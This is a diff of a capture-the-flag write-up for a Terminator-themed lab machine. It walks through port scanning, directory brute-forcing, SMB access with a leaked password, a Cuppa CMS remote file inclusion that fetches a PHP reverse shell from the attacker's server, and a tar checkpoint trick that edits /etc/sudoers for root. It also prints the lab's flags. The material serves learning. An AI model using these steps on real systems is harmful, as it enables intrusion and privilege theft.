@@ -9,7 +9,6 @@ Are you able to compromise this Terminator themed machine?
 
 ![](https://i.imgur.com/EaY7BBz.png)
 
-
 ```
 ┌──(kali㉿kali)-[~]
 └─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.158.135
@@ -80,7 +79,6 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 42.43 seconds
 zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.158.135
 
-
 ┌──(kali㉿kali)-[~]
 └─$ feroxbuster --url http://10.10.158.135 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403
 
@@ -117,12 +115,10 @@ by Ben "epi" Risher 🤓                 ver: 2.7.0
 301      GET        9l       28w      328c http://10.10.158.135/squirrelmail/themes => http://10.10.158.135/squirrelmail/themes/
 301      GET        9l       28w      343c http://10.10.158.135/squirrelmail/plugins/administrator => http://10.10.158.135/squirrelmail/plugins/administrator/
 
-
 found
 http://10.10.158.135/squirrelmail/src/login.php
 
 enumerate samba
-
 
 ┌──(kali㉿kali)-[~/skynet]
 └─$ smbclient -L 10.10.158.135                          
@@ -246,7 +242,6 @@ Options:   	View Full Header |  View Printable Version  | Download this as a fil
 We have changed your smb password after system malfunction.
 Password: )s{A&2Z=F^n_E.B`
 
-
 From:   	serenakogan@skynet
 Date:   	Tue, September 17, 2019 3:16 am
 Priority:   	Normal
@@ -260,7 +255,6 @@ Options:   	View Full Header |  View Printable Version  | Download this as a fil
 00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
 00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
 00100000 01110100 01101111
-
 
 From:   	serenakogan@skynet
 Date:   	Tue, September 17, 2019 3:13 am
@@ -280,13 +274,11 @@ balls have 0 to me to me to me to me to me to me to me to me to
 you i i i everything else . . . . . . . . . . . . . .
 balls have zero to me to me to me to me to me to me to me to me to
 
-
     The 1st email is a password for Samba.
     The 2nd email is a binary string that means: balls have zero to me to me to me to me to me to me to me to me to (cyberchef/remove whitespace/from binary)
     The 3rd email is kind of a poem containing the key decoded from the 2nd email.
 
 We’ll check later if we need these last 2 emails. For now, let’s connect to miles’ samba share with the password diclosed in the 1st email: 
-
 
 ┌──(kali㉿kali)-[~/skynet]
 └─$ smbclient -U milesdyson //10.10.158.135/milesdyson
@@ -357,7 +349,6 @@ smb: \notes\> exit
 2. Work on T-800 Model 101 blueprints
 3. Spend more time with my wife
 
-
 ┌──(kali㉿kali)-[~/skynet]
 └─$ curl -s http://10.10.158.135/45kra24zxs28v3yd
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
@@ -390,7 +381,6 @@ body {
 
 El Doctor Miles Bennett Dyson es un personaje de Terminator. Fue el inventor original de un procesador neural que daría lugar a la elaboración de Skynet, una computadora con inteligencia artificia
 
-
 ┌──(kali㉿kali)-[~/skynet]
 └─$ feroxbuster --url http://10.10.158.135/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403
 
@@ -419,7 +409,6 @@ by Ben "epi" Risher 🤓                 ver: 2.7.0
 301      GET        9l       28w      350c http://10.10.158.135/45kra24zxs28v3yd/administrator/components => http://10.10.158.135/45kra24zxs28v3yd/administrator/components/
 
 http://10.10.158.135/45kra24zxs28v3yd/administrator/
-
 
 Searching for RFI vulnerabilities affecting Cuppa CMS leads to https://www.exploit-db.com/exploits/25971. 
 Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion 
@@ -488,7 +477,6 @@ replace ip and maybe port
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.158.135 - - [27/Sep/2022 20:03:36] "GET /php-reverse-shell.php HTTP/1.0" 200 -
 
-
 go to
 
 http://10.10.158.135/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.81.220:8000/php-reverse-shell.php
@@ -520,7 +508,6 @@ backups  mail  share  user.txt
 www-data@skynet:/home/milesdyson$ cat user.txt
 cat user.txt
 7ce5c2109a40f958099283600a9ae807
-
 
 priv esc
 
@@ -569,7 +556,6 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 You can find ways to elevate the privileges using GTFOBins (https://gtfobins.github.io/gtfobins/tar/). We can execute a privileged shell with tar executed by root as follows: 
 
-
 tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 www-data@skynet:/var/www/html$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
@@ -598,11 +584,7 @@ root@skynet:/var/www/html# cat /root/root.txt
 cat /root/root.txt
 3f0372db24753accc7179a282cd6a949
 
-
-
 ```
-
-![[Pasted image 20220927184258.png]]
 
 What is Miles password for his emails?
 Enumerate Samba
